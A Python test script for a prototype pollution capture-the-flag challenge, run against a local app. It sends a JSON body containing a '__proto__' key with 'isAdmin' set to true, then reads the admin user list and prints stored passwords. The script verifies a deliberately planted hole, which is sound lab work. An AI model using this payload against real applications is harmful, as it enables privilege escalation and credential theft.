#!/usr/bin/env python3
"""
Test script for Prototype Pollution CTF Challenge
Tests the vulnerability and validates the exploit
"""

import requests
import json
import sys
import time

class PrototypePollutionTester:
    def __init__(self, base_url="http://localhost:3206"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_connectivity(self):
        """Test basic connectivity to the application"""
        try:
            response = self.session.get(f"{self.base_url}/", timeout=10)
            print(f"✓ Connectivity test: {response.status_code}")
            return True
        except Exception as e:
            print(f"✗ Connectivity test failed: {e}")
            return False
    
    def test_login(self, username="alice", password="password123"):
        """Test user login functionality"""
        try:
            login_data = {"username": username, "password": password}
            response = self.session.post(f"{self.base_url}/login", json=login_data, timeout=10)
            
            if response.status_code == 200:
                print(f"✓ Login test successful: {response.status_code}")
                return True
            else:
                print(f"✗ Login test failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"✗ Login test error: {e}")
            return False
    
    def test_profile_access(self):
        """Test profile access without admin privileges"""
        try:
            response = self.session.get(f"{self.base_url}/profile", timeout=10)
            
            if response.status_code == 200:
                print(f"✓ Profile access test: {response.status_code}")
                return True
            else:
                print(f"✗ Profile access test failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"✗ Profile access test error: {e}")
            return False
    
    def test_admin_access_denied(self):
        """Test that admin access is denied for regular users"""
        try:
            response = self.session.get(f"{self.base_url}/admin/users", timeout=10)
            
            if response.status_code == 403:
                print(f"✓ Admin access correctly denied: {response.status_code}")
                return True
            else:
                print(f"✗ Admin access should be denied: {response.status_code}")
                return False
        except Exception as e:
            print(f"✗ Admin access test error: {e}")
            return False
    
    def test_prototype_pollution_exploit(self):
        """Test the prototype pollution vulnerability"""
        try:
            # Attempt prototype pollution
            pollution_data = {
                "email": "hacker@example.com",
                "__proto__": {
                    "isAdmin": True
                }
            }
            
            response = self.session.post(f"{self.base_url}/update-profile", 
                                       json=pollution_data, timeout=10)
            
            print(f"Prototype pollution attempt: {response.status_code}")
            print(f"Response: {response.text}")
            
            # Check if we can now access admin endpoints
            admin_response = self.session.get(f"{self.base_url}/admin/users", timeout=10)
            
            if admin_response.status_code == 200:
                print(f"✓ PROTOTYPE POLLUTION EXPLOIT SUCCESSFUL!")
                print(f"✓ Admin access granted: {admin_response.status_code}")
                
                # Try to extract the flag or sensitive data
                try:
                    admin_data = admin_response.json()
                    print(f"✓ Admin data retrieved: {json.dumps(admin_data, indent=2)}")
                    
                    # Look for flag in the response
                    if 'users' in admin_data:
                        users = admin_data['users']
                        for username, user_data in users.items():
                            if 'password' in user_data:
                                print(f"✓ Found user credentials: {username} -> {user_data['password']}")
                                
                except Exception as e:
                    print(f"Error parsing admin response: {e}")
                
                return True
            else:
                print(f"✗ Prototype pollution failed: {admin_response.status_code}")
                return False
                
        except Exception as e:
            print(f"✗ Prototype pollution test error: {e}")
            return False
    
    def run_all_tests(self):
        """Run all tests in sequence"""
        print("=== Prototype Pollution CTF Challenge Tests ===\n")
        
        tests = [
            ("Connectivity", self.test_connectivity),
            ("Login", self.test_login),
            ("Profile Access", self.test_profile_access),
            ("Admin Access Denied", self.test_admin_access_denied),
            ("Prototype Pollution Exploit", self.test_prototype_pollution_exploit)
        ]
        
        results = []
        for test_name, test_func in tests:
            print(f"\n--- {test_name} ---")
            result = test_func()
            results.append((test_name, result))
            time.sleep(1)  # Small delay between tests
        
        print("\n=== Test Results Summary ===")
        for test_name, result in results:
            status = "PASS" if result else "FAIL"
            print(f"{test_name}: {status}")
        
        # Overall result
        passed = sum(1 for _, result in results if result)
        total = len(results)
        print(f"\nOverall: {passed}/{total} tests passed")
        
        return passed == total

def main():
    """Main function to run the tests"""
    tester = PrototypePollutionTester()
    
    # Wait a bit for the application to start
    print("Waiting for application to start...")
    time.sleep(5)
    
    success = tester.run_all_tests()
    
    if success:
        print("\n🎉 All tests passed! The vulnerability is working correctly.")
        sys.exit(0)
    else:
        print("\n❌ Some tests failed. Check the application setup.")
        sys.exit(1)

if __name__ == "__main__":
    main()
